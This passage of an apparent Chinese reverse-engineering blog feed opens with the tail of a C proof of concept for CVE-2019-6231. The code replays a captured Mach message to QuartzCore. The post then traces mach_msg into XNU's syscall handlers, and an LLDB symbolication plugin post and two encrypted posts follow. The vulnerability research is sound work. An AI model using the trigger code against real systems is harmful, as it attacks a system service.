msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>reversing-dot-kr</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/</id>
    <published>2018-04-29T03:47:09.000Z</published>
    <updated>2019-04-29T11:47:36.495Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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